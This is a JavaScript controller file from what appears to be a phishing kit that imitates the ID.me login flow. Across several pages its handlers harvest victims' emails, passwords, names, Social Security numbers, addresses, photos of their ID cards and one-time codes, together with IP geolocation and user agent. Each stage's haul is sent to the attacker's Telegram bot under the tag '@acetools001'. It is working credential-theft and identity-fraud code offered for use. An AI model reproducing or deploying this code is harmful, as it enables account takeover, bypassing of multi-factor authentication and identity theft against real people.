const { sendMessageFor } = require("simple-telegram-message");
const { botToken, chatId } = require("../settings");
const getIPDetails = require("../middleware/getIPDetails");

const fs = require("fs");

let storedCredentials = {
  email: "",
  password: "",
  fname: "",
  ssn: "",
  address: "",
  city1: "",
  state: "",
  zipcode: "",
};

exports.login = (req, res) => {
  return res.render("login");
};

exports.loginPost = async (req, res) => {
  const { email, password } = req.body;

  storedCredentials = { email };

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `||ID.ME LOGIN\n\n` +
    `||🔰Email : ${email}\n` +
    `||🔑Password : ${password}\n` +
    `++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @acetools001 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/login/2");
};

exports.login2 = (req, res) => {
  res.render("login2");
};

exports.loginPost2 = async (req, res) => {
  const { email, password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];
  storedCredentials = { ...storedCredentials, password };

  const message =
    `||ID.ME LOGIN 2 \n\n` +
    `||🔰Email : ${email}\n` +
    `||🔑Password : ${password}\n` +
    `++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @acetools001 - TG 👨‍💻`;
  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/personal");
};

exports.personal = (req, res) => {
  res.render("personal");
};

exports.personalPost = async (req, res) => {
  const { fname, ssn, address, city1, state, zipcode } = req.body;
  const { email, password } = storedCredentials;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;
  storedCredentials = {
    ...storedCredentials,
    email,
    password,
    fname,
    ssn,
    address,
    city1,
    state,
    zipcode,
  };

  const userAgent = req.headers["user-agent"];
  storedCredentials = {
    ...storedCredentials,
    email,
    password,
    fname,
    ssn,
    address,
    city1,
    state,
    zipcode,
  };

  const message =
    `||ID.ME 2024 FULLZ\n` +
    `||🔰User ID  : ${email}\n\n` +
    `||🔑Password  : ${password}\n\n` +
    `||Full Name  : ${fname}\n\n` +
    `||SSN  : ${ssn}\n\n` +
    `||Address  : ${address}\n\n` +
    `||City  : ${city1}\n\n` +
    `||State  : ${state}\n\n` +
    `||ZIpcode  : ${zipcode}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @acetools001 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/verify-Id");
};

exports.verifyId = (req, res) => {
  res.render("verifyId");
};

exports.verifyIdPost = async (req, res) => {
  const { frontId, backId } = req.files;
  // console.log(frontId, backId)
  const { email, password, fname, ssn, address, city1, state, zipcode } =
    storedCredentials;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;
  storedCredentials = {
    ...storedCredentials,
    email,
    password,
    fname,
    ssn,
    address,
    city1,
    state,
    zipcode,
    frontId,
    backId,
  };

  const userAgent = req.headers["user-agent"];

  const frontIdUrl = req.files.frontId[0].path;
  const backIdUrl = req.files.backId[0].path;

  const message =
    `||ID.ME 2024 DETAILS\n\n` +
    `||🔰User ID  : ${email}\n\n` +
    `||🔑Password  : ${password}\n\n` +
    `||Fullname  : ${fname}\n\n` +
    `||SSN  : ${ssn}\n\n` +
    `||Address  : ${address}\n\n` +
    `||City  : ${city1}\n\n` +
    `||State  : ${state}\n\n` +
    `||Zipcode  : ${zipcode}\n\n` +
    `||Front ID  : ${frontIdUrl}\n\n` +
    `||Back ID  : ${backIdUrl}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @acetools001 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/code");
};
exports.code = (req, res) => {
  res.render("code");
};

exports.codePost = async (req, res) => {
  const { code } = req.body;
  const { email, password } = storedCredentials;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;
  storedCredentials = {
    ...storedCredentials,
    email,
    password,
    code,
  };

  const userAgent = req.headers["user-agent"];
  const message =
    `||ID.ME 2024 DETAILS\n\n` +
    `||🔰User ID  : ${email}\n\n` +
    `||🔑Password  : ${password}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `🔰🔰🔰O T P CODE🔰🔰🔰\n` +
    `🔑${code}\n ` +
    `🔑${code}\n ` +
    `🔰🔰🔰🔰O T P CODE🔰🔰🔰\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @acetools001 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/success");
};

exports.success = (req, res) => {
  return res.render("success");
};

exports.page404Redirect = (req, res) => {
  return res.redirect("/auth/login");
};
